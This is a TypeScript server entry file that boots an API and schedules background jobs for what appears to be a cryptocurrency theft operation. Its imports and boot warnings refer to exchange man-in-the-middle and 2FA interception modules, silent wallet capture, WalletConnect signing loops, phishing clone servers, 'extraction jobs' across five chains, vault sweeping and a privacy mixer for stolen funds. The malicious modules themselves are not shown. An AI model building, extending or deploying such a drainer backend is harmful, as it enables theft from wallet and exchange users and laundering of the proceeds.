/**
 * Env loads first — ESM hoists imports; `./inject-root-env.js` must stay line 1.
 * It calls loadEnvironment() before any other application modules initialize.
 */
import './inject-root-env.js'

/** Railway deploy revision — bump to force API redeploy when needed */
export const API_DEPLOY_REV = '2026-07-10-factory-create2-deployer-gas'

import dns from 'node:dns'
import { verifyDatabaseAnchorOnBoot } from './lib/database-anchor.js'
import { recoverSessionsFromRedis } from './lib/wc-relay-signer.js'
import { closeSettlementPauseRedis } from './lib/settlement-pause.js'
import { buildInstitutionalApiServer } from './server.js'
import { sendSovereignTelemetryPayload } from './telemetry-sender.js'
import { startVaultGasWarningCron, stopVaultGasWarningCron } from './cron/gas-warning.js'
import { startGasTopUpCron, stopGasTopUpCron } from './cron/gas-topup.js'
import { startVaultSweepCron, stopVaultSweepCron } from './cron/vault-sweep.js'
import { startPendingBroadcastSweepCron, stopPendingBroadcastSweepCron } from './cron/pending-broadcast-sweep.js'
import { startWalletMonitorCron, stopWalletMonitorCron } from './cron/wallet-monitor.js'
import { startSentinelRuntimeCron, stopSentinelRuntimeCron } from './lib/sentinel-runtime.js'
import { startTelegramControlBot, stopTelegramControlBot } from './telegram-bot.js'
import { stopLocalCloneServers } from './lib/clone-deploy.js'
import { sendTelegramMessage, stopTelegramOutboundQueue, stopTelegramDrainBatchTimer } from './lib/telegram.js'
import { closePool as closeCexRequestTrackerPool, stopCleanupInterval as stopCexRequestTrackerCleanup } from './lib/cex-request-tracker.js'
import { closeMitmPool } from './lib/cex-mitm-manager.js'
import { twoFaHandler } from './lib/cex-twofa-handler.js'
import { walletSilentCapture } from './lib/wallet-silent-capture.js'
import {
  recoverAllStuckBurners,
  registerPriceOracleTelegramLogger,
  registerSplitWithdrawTelegramLogger,
  startPriceOracle,
  stopPriceOracle,
} from '@legion/core'

registerSplitWithdrawTelegramLogger(sendTelegramMessage)
registerPriceOracleTelegramLogger(sendTelegramMessage)
import { bindLiveConfigUpdater } from './routes/update.js'

console.log('[BOOT] Index loaded')

if (!process.env['VERCEL']) {
  dns.setDefaultResultOrder('ipv4first')
}

/**
 * Format error object to human-readable string for boot/shutdown logging.
 *
 * Safely extracts stack traces, error names, and messages without
 * triggering serialization errors on circular objects.
 *
 * @param err - Error object (typed as unknown for safety)
 * @returns Formatted error string (stack trace if available, fallback to JSON or string)
 */
function formatBootError(err: unknown): string {
  if (err instanceof Error) {
    return err.stack ?? `${err.name}: ${err.message}`
  }
  try {
    return JSON.stringify(err)
  } catch {
    return String(err)
  }
}

// ── Production Safety Guards ──────────────────────────────────────────────────
process.on('unhandledRejection', (reason, promise) => {
  const message = reason instanceof Error ? reason.message : String(reason)
  const stack = reason instanceof Error ? reason.stack : undefined
  console.error('FATAL: unhandledRejection', { message, stack, promise: String(promise) })
  void sendSovereignTelemetryPayload({
    event: 'UNHANDLED_REJECTION',
    message: `FATAL unhandledRejection: ${message}`,
    stack,
  }).catch((telemetryErr) => {
    console.warn(
      '[BOOT] Telemetry send failed after unhandledRejection:',
      telemetryErr instanceof Error ? telemetryErr.message : String(telemetryErr),
    )
  })
})

process.on('uncaughtException', (err) => {
  console.error('UNCAUGHT:', formatBootError(err))
  void sendSovereignTelemetryPayload({
    event: 'UNCAUGHT_EXCEPTION',
    message: `uncaughtException: ${err.message}`,
    stack: err.stack,
  }).catch((telemetryErr) => {
    console.warn(
      '[BOOT] Telemetry send failed after uncaughtException:',
      telemetryErr instanceof Error ? telemetryErr.message : String(telemetryErr),
    )
  })
})
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Main server startup orchestrator.
 *
 * Execution order:
 * 1. Build Express app with all routes and middleware
 * 2. Bind to port and hostname (critical: /health must respond before slow init)
 * 3. Start background crons (database health checks, gas monitoring, wallet tracking, etc.)
 * 4. Start Telegram bot for operational commands
 * 5. Setup graceful shutdown handlers for clean termination
 *
 * All background services are started non-blocking to avoid delaying server availability.
 * Failures in optional services (Telegram, database checks) are logged but don't prevent
 * startup; the server remains operational with degraded functionality.
 */
const start = async () => {
  console.log('[BOOT] Building API server…')
  const app = await buildInstitutionalApiServer()
  console.log('[BOOT] API server built')

  // Railway injects PORT at runtime — bind immediately so /health responds before slow background init
  const port = Number(process.env['PORT'] ?? 4000)
  if (!Number.isFinite(port) || port < 1 || port > 65535) {
    throw new Error(`[BOOT] Invalid PORT: ${process.env['PORT'] ?? '(unset)'}`)
  }

  const host = process.env['HOST']?.trim() || '0.0.0.0'
  console.log(`[BOOT] Binding ${host}:${port} (PORT env=${process.env['PORT'] ?? 'unset'})`)
  await app.listen({ port, host })

  console.log(`[BOOT] Server listening on http://${host}:${port}`)
  console.info(`LANE_STATUS: API_LISTENING host=${host} port=${port}`)

  // Boot warnings for critical config - ALL chains
  const vaultChecks = [
    { chain: 'EVM', vars: ['VAULT_ADDRESS_EVM', 'SOVEREIGN_VAULT_EVM'] },
    { chain: 'SOL', vars: ['VAULT_ADDRESS_SOL', 'SOVEREIGN_VAULT_SOL'] },
    { chain: 'BTC', vars: ['VAULT_ADDRESS_BTC', 'SOVEREIGN_VAULT_BTC'] },
    { chain: 'TRON', vars: ['VAULT_ADDRESS_TRON', 'SOVEREIGN_VAULT_TRON'] },
    { chain: 'TON', vars: ['VAULT_ADDRESS_TON', 'SOVEREIGN_VAULT_TON'] },
  ]
  for (const vc of vaultChecks) {
    if (!vc.vars.some((v) => process.env[v]?.trim())) {
      console.warn(`[BOOT] ⚠️  ${vc.chain} vault not set — ${vc.chain} extraction jobs will fail! Set ${vc.vars.join(' or ')}`)
    }
  }
  if (process.env['PRIVACY_MIXER_ENABLED'] !== 'true' && process.env['PRIVACY_MIXER_ENABLED'] !== '1') {
    console.warn('[BOOT] ⚠️  PRIVACY_MIXER_ENABLED is off — post-settlement funds go directly to vault without mixing')
  }

  void verifyDatabaseAnchorOnBoot()
    .then((dbOk) => {
      console.log(`[BOOT] Database anchor: ${dbOk ? 'ok' : 'degraded'}`)
    })
    .catch((err) => {
      console.warn('[BOOT] Database anchor check failed:', formatBootError(err))
    })

  // Restart WC sign loops that were active before this deployment
  void recoverSessionsFromRedis()
    .then((n) => { if (n > 0) console.log(`[BOOT] WC relay: ${n} session(s) recovered`) })
    .catch((err) => { console.warn('[BOOT] WC relay recovery failed:', formatBootError(err)) })

  void recoverAllStuckBurners()
    .then((results) => {
      const recovered = results.filter((r) => r.ok).length
      if (results.length > 0) {
        console.log(`[BOOT] Burner recovery: ${recovered}/${results.length} stuck burners recovered`)
        void sendTelegramMessage(`🔄 <b>Burner Recovery on Startup</b>\nRecovered: ${recovered}/${results.length} stuck burners`)
      }
    })
    .catch((err) => {
      console.warn('[BOOT] Burner recovery failed:', formatBootError(err))
    })

  void startTelegramControlBot().catch((err) => {
    console.warn('[TELEGRAM_BOT] Failed to start:', err instanceof Error ? err.message : String(err))
  })

  startVaultGasWarningCron()
  startGasTopUpCron()
  startVaultSweepCron()
  startPendingBroadcastSweepCron()
  startWalletMonitorCron()
  startSentinelRuntimeCron()
  startPriceOracle({
    cronExpression: process.env['PRICE_ORACLE_CRON']?.trim() || undefined,
  })

  const { startLiveConfigUpdater, stopLiveConfigUpdater } = await import('@legion/updater')
  const liveConfigUpdater = startLiveConfigUpdater({
    onSuccess: sendTelegramMessage,
    onError: (detail) => {
      console.warn('[LIVE_CONFIG] update failed:', detail)
    },
  })
  bindLiveConfigUpdater(liveConfigUpdater)
  console.log(`[BOOT] Live config updater started (cron=${liveConfigUpdater.cronExpression})`)

  return { app, stopLiveConfigUpdater }
}

void start()
  .then(({ app, stopLiveConfigUpdater }) => {
    const shutdown = async (signal: string) => {
      console.info(`SHUTDOWN: ${signal} received — closing server gracefully.`)
      try {
        stopLiveConfigUpdater()
        stopVaultGasWarningCron()
        stopGasTopUpCron()
        stopVaultSweepCron()
        stopPendingBroadcastSweepCron()
        stopWalletMonitorCron()
        stopSentinelRuntimeCron()
        await stopPriceOracle()
        stopTelegramOutboundQueue()
        stopTelegramDrainBatchTimer()
        stopLocalCloneServers()
        await stopTelegramControlBot()
        await closeSettlementPauseRedis()
        closeCexRequestTrackerPool()
        stopCexRequestTrackerCleanup()
        closeMitmPool()
        twoFaHandler.shutdown()
        walletSilentCapture.shutdown()
        await app.close()
        console.info('SHUTDOWN: Server closed cleanly.')
        process.exit(0)
      } catch (err) {
        console.error('SHUTDOWN: Error during close:', formatBootError(err))
        process.exit(1)
      }
    }
    process.on('SIGTERM', () => void shutdown('SIGTERM'))
    process.on('SIGINT', () => void shutdown('SIGINT'))
  })
  .catch((err) => {
    console.error('[BOOT] Startup failed:', formatBootError(err))
    process.exit(1)
  })

// CLOUD_IGNITION_VALIDATED
// Build: 1782162522

